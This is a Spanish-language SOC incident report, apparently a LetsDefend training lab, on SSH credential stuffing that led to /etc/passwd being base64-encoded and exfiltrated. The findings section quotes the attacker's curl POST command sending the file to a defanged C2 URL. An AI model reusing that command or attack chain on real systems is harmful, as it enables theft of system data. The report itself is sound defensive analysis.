# Informe de Incidente - Suspicious Base64 Encoding/Decoding Commands Detected

## 1. Resumen Ejecutivo

Se investigó una alerta de seguridad relacionada con la detección de comandos de codificación base64 en el endpoint Clark (172.16.20.43).

La investigación determinó que se trata de un Verdadero Positivo.

---

## 2. Detalles de la Alerta

| Campo | Valor |
|---|---|
| Plataforma | LetsDefend |
| ID del Caso | SOC302 |
| Tipo de Alerta | Fuerza Bruta |
| Severidad | Alta |
| Estado | Escalado |
| Analista | Jorge Fernández Córcoles |
| Fecha | 05/09/2026 |

---

## 3. Información Inicial de la Alerta

| Campo | Valor |
|---|---|
| Nombre de la alerta | Suspicious Base64 Encoding/Decoding Commands Detected |
| IP origen | 89.187.185.184 |
| IP destino | 172.16.20.43 |
| Hostname | Clark |
| Usuario | Analyst |
| Hash del fichero | |
| URL / Dominio | http://ukr-net-files-loading-application[.]ru/upload |
| Timestamp | 2024-08-07 07:26:25 |

---

## 4. Pasos de la Investigación

### 4.1 Revisión de la Alerta
La alerta mostraba sospechosos comandos de codificación/decodificación detectados. La nota del SOC analyst L1 nos plantea el intento de fuerza bruta hacia usuarios diferentes y desde la IP `89.187.185.184`. Sin embargo, anotaba que no podía determinar con exactitud si se trataba de un falso o verdadero positivo. Es por eso que requirió investigación extra. 

### 4.2 Análisis de Logs
Los logs mostraron que efectivamente el adversario realizó numerosos intentos de conexión remota vía SSH a diferentes cuentas de usuario con diferentes contraseñas. Esto podríamos clasificarlo como credential stuffing, porque no son intentos realizados a la misma cuenta de usuario sino hacia cuentas distintas. Cuentas inválidas: Dikec, Hitman y test. Cuentas fallidas: Yusuf y Analyst. Cuenta con inicio de sesión exitoso: Analyst. 

### 4.3 Análisis de IOCs
`89.187.185.184` es la dirección IP desde la cual se ejecuta el credential stuffing.
`test.txt` es el fichero con el contenido de /etc/passwd que el atacante crea en el endpoint. 
`encoded.dat` es el archivo codificado para evitar que el EDR detecte la exfiltración. 
`http://ukr-net-files-loading-application[.]ru/upload` es el C2 donde se exfiltra el `encoded.dat` que incluye el archivo de configuración `/etc/passwd`. 

### 4.4 Actividad del Usuario / Endpoint
La actividad del atacante en el endpoint una vez este consiguió acceso inicial gracias a la técnica de credential stuffing comenzó con una fase de reconocimiento, donde ejecuta comandos como `whoami`, `netstat -tuln`, `hostname` y `cat /etc/group`. Después comienza la recolecta de datos que posteriormente exfiltrará. Crea `test.txt` con el contenido de `/etc/passwd` y después lo codifica en base64 para que su envío hacia afuera de la organización no sea bloqueado. Por último, ejecuta un POST del archivo codificado a `http://ukr-net-files-loading-application[.]ru/upload`, el sitio web del C2. 

### 4.5 Línea de Tiempo del Incidente

| Timestamp | Evento |
|---|---|
| 07:21:14 | Primer intento de fuerza bruta hacia la cuenta de usuario Yusuf |
| 07:22:13 | El atacante realiza la conexión con éxito vía SSH a la cuenta de usuario Analyst |
| 07:22:34 | Comienza a ejecutar comandos de reconocimiento para saber el usuario actual, el nombre del host, mostrar todos los puertos de red que estén escuchando en ese momento... |
| 07:25:27 | Creación del archivo test.txt con `touch test.txt` y edición con `vi test.txt`  |
| 07:26:27 | Codificación del archivo con alto valor para conseguir eludir las reglas bloqueantes |
| 07:26:48 | Exfiltración de los datos del archivo de configuración al sitio web comprometido: `http://ukr-net-files-loading-application[.]ru/upload` |

---

## 5. Hallazgos

- `89.187.185.184`, escaneada con AbuseIPDB con un 12% de confianza de compromiso. No es una evidencia de compromiso pero respalda lo analizado en los logs. 
- Numerosos intentos de conexión vía SSH desde la dirección IP maliciosa, catalogados en conjunto como **credential stuffing**.
- `test.txt` -> codificado en base64 -> `encoded.dat`.
- `curl -X POST -F "file=@/root/Documents/encoded.dat" http://ukr-net-files-loading-application[.]ru/upload`, es el comando que realiza el POST exfiltrando `encoded.dat` hacia el servidor de C2. El sitio web está marcado como malicioso en VirusTotal por 14 de 96 proveedores de seguridad. 
---

## 6. Mapeo MITRE ATT&CK

| Táctica | Técnica | Sub-técnica | Descripción |
|---|---|---|---|
|Acceso inicial | T1078 | T1078.003 | Los atacantes abusan de las credenciales de una cuenta local para conseguir acceso inicial |
| Acceso incial | T1133 | | El atacante aprovecha servicios remotos externos como SSH para conseguir acceso al sistema |
| Acceso con Credenciales | T1003 | T1003.008 | Los adversarios pueden intentar volcar el contenido de /etc/passwd |
| Acceso con Credenciales | T1110 | T1110.004 | El atacante intenta acceder vía credential stuffing al endpoint |
| Comando y Control | T1132 | T1132.001 | El atacante busca codificar los datos con base64 para después exfiltrarlos al C2 |
| Ejecución | T1059 | T1059.004 | El atacante abusa de los comandos de la shell de Unix para su ejecución |
| Sigilo | T1027 | T1027.013 | El atacante codifica archivos para ocultar cadenas, bytes y otros patrones específicos, dificultando así su detección |


---

## 7. Herramientas Utilizadas

| Herramienta | Uso |
|---|---|
| VirusTotal | Para checkear el sitio web de la exfiltración del /etc/passwd |
| AbuseIPDB | Para checkear la IP origen del ataque |
| MITRE ATT&CK | Para realizar el mapeo de las TTPs |

---

## 8. Conclusión

| Campo | Valor |
|---|---|
| Clasificación | Verdadero Positivo |
| Impacto |  Alto |

---

## 9. Acciones Recomendadas

- Bloquear dirección IP, dominios y sitios web asociados con el atacante. 
- Contención y aislamiento del endpoint Clark.
- Rotación de las credenciales de Analyst al haberse visto comprometidas por el credential stuffing. 
- Activar MFA en SSH. 
- Revisar por qué una IP pública alcanzaba directamente por SSH a un endpoint de la organización.
- Buscar telemetría asociada al ataque: movimiento lateral o persistencia. 
- Verificar si se accedió a `/etc/shadow` porque eso cambiaría el impacto del ataque.

---
